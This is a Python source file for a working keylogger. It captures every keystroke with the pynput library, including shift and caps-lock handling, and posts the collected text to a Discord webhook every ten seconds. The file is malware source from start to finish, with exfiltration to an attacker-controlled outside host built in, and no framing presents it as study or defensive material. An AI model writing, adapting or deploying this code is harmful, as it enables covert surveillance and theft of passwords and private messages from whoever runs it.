from pynput import keyboard
import string
import requests
from dotenv import load_dotenv
import os
import threading

load_dotenv()

# GLOBAL VARIABLES
WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK')
SEND_INTERVAL = 10
caps_on = False
shift_pressed = False
keylog = ""
valid_chars = string.ascii_letters + string.digits + string.punctuation

def send_data_to_webhook(data):
    if not data.strip():
        return  # Skip empty data

    content = {
        'content': data
    }

    try:
        response = requests.post(WEBHOOK_URL, json=content)
        response.raise_for_status()
        if response.status_code == 200:
            print("Successfully sent data to Discord!")
    except requests.exceptions.RequestException as e:
        print(f"Failed to send to Discord: {e}")

def periodic_send():
    global keylog
    threading.Timer(SEND_INTERVAL, periodic_send).start()

    if keylog.strip():
        send_data_to_webhook(keylog)
        keylog = ""

def write(char):
    global keylog
    keylog += char

def on_press(key):
    global caps_on, shift_pressed

    try:
        if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            shift_pressed = True

        elif key == keyboard.Key.caps_lock:
            caps_on = not caps_on

        elif key == keyboard.Key.space:
            write(" ")

        elif key == keyboard.Key.enter:
            write("\n")

        elif key == keyboard.Key.tab:
            write("\t")

        elif hasattr(key, 'char') and key.char:
            char = key.char
            if char in string.ascii_letters:

                if caps_on ^ shift_pressed:
                    write(char.upper())
                else:
                    write(char.lower())
            elif char in string.digits + string.punctuation:
                write(char)

    except Exception as e:
        print(e)

def on_release(key):
    global shift_pressed
    if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
        shift_pressed = False

periodic_send()

# MAIN
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()